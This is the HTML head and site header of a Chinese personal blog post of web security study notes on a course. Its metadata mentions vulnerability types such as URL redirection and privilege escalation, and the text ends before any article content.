<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"lishang520.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="web安全学习笔记（painter） #学习总纲 1、边学习，边挖src 2、课程学习只是了解的过程，让我们有个概念，但是学习的时候笔记需要做好，方便以后需要查看细节、具体命令的时候可以查找 3、涉及到一些漏洞的讲解，比如url跳转、任意密码修改、越权、支付漏洞等，其中涉及到payload的，直接利用即可，因为靶场是后面搭建的，一些漏洞页面都没有，仅仅是为了让我们了解，所以直接利用payload即">
<meta property="og:type" content="article">
<meta property="og:title" content="web安全(合天网安)">
<meta property="og:url" content="https://lishang520.github.io/2021/08/10/web%E5%AE%89%E5%85%A8-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/index.html">
<meta property="og:site_name" content="painter&#39;s Blog">
<meta property="og:description" content="web安全学习笔记（painter） #学习总纲 1、边学习，边挖src 2、课程学习只是了解的过程，让我们有个概念，但是学习的时候笔记需要做好，方便以后需要查看细节、具体命令的时候可以查找 3、涉及到一些漏洞的讲解，比如url跳转、任意密码修改、越权、支付漏洞等，其中涉及到payload的，直接利用即可，因为靶场是后面搭建的，一些漏洞页面都没有，仅仅是为了让我们了解，所以直接利用payload即">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141558674.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141615584.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141634594.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141704704.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141722430.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141735823.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141748656.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141819319.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141830949.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141842930.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141848442.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141905731.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141917142.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141930688.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141952212.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142005101.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142033685.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142046998.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142057453.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142110835.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202142216936.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181038859.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181155969.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181257353.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181536681.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181810913.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181900513.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202181904731.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182322203.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182335446.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182339675.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182453404.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182457881.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182633974.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182707499.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182808354.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182829263.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202182852892.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183003959.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183015283.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183040680.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183140869.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183322414.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183427139.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183623364.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183720198.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202183732682.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184033636.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184138162.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184501486.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184522471.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184748454.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202184824694.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185000574.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185052760.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185101298.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210132655714.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210213537182.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210132832766.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210135341065.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210132514201.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210213656557.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210141351923.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210141709404.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210210135409051.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185208248.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185219818.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185345476.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185356069.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185411889.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185421893.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185508285.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185512873.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185524025.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185534355.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185546341.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185555225.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185702895.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185713913.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202185724002.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190225075.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190228615.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190239846.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190254073.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190300587.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190315073.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202190338645.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191129372.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191150346.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191358638.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191409174.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191414505.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191649923.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191658089.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202191710682.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202192136652.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202204624648.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202204632045.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202204637366.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202204644541.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202204650300.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205318371.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205333422.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205346039.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205438036.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205443240.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205457517.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205532232.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205543057.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205602885.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205614598.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205652407.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205741051.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205806445.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202205810170.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210005515.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210009461.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210122761.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210158294.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210201701.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210228471.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210234705.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210242346.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210254686.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210258296.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210304428.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210320771.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210332876.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210337251.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210550394.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210554052.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210706985.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210734036.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210737066.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202210755683.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203130305023.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203130430974.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203130544206.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134040487.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134104986.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134458730.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134542070.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134641958.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203134854247.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203140056859.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203140718369.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203141459010.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210203141847691.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204131128534.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135620572.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135656922.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135811179.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135226578.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135401907.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210204135440540.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205123147313.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205123453539.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205123404885.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205125059753.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205125159886.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206121342919.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206121504533.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210207134630226.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210207134638547.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210207134652547.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206135144571.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206135517409.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206135545046.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206140154990.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206140546214.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206140605593.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206141300958.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206141751161.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206141934912.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206142605296.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206142650917.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210206142728887.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208125726830.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208130211351.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208130252716.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208134202818.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209190655990.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211165712905.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211165739906.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211165349806.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211165404864.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211171834562.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211171701776.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211180331959.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211214030585.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211175211956.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211173856313.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211173556052.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211175030686.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211174117192.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211094603579.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211094846382.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211085314197.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211085557516.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211085919376.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211085957911.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211090129794.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211090406060.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211090447865.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211090616035.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211090714727.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211095628318.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211150811888.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211151335525.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211151836635.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211152201706.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209182511725.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209192102027.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211170646713.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210211214528996.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208194514800.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210208194629958.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184357800.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184645690.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184437205.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184607524.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184625467.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209184752572.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209121705416.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209122148554.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209122404231.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209122725134.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209122811930.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209123002190.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209123054891.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209123301192.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210209123359455.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202140942469.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210202141238718.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194756830.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194813126.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194825838.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194839392.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194844082.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194857053.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194902447.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194918584.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194923512.png">
<meta property="og:image" content="https://lishang520.github.io/source/hetian/image-20210205194928855.png">
<meta property="article:published_time" content="2021-08-10T11:55:36.000Z">
<meta property="article:modified_time" content="2021-08-10T12:34:38.771Z">
<meta property="article:author" content="painter">
<meta property="article:tag" content="web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lishang520.github.io/source/hetian/image-20210202141558674.png">

<link rel="canonical" href="https://lishang520.github.io/2021/08/10/web%E5%AE%89%E5%85%A8-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>web安全(合天网安) | painter's Blog</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?24a57553e96b4b8b803c9794fd76b400";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">painter's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-主页">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>

  </li>
        <li class="menu-item menu-item-关于我">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>

  </li>
        <li class="menu-item menu-item-标签">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-分类">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-归档">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-友情链接">

    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>友情链接</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/lishang520/" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lishang520.github.io/2021/08/10/web%E5%AE%89%E5%85%A8-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/%E5%A4%B4%E5%83%8F.jpg">
      <meta itemprop="name" content="painter">
      <meta itemprop="description" content="painter的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="painter's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          web安全(合天网安)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-10 19:55:36 / 修改时间：20:34:38" itemprop="dateCreated datePublished" datetime="2021-08-10T19:55:36+08:00">2021-08-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2021/08/10/web%E5%AE%89%E5%85%A8-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/08/10/web%E5%AE%89%E5%85%A8-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89/" itemprop="commentCount"></span>
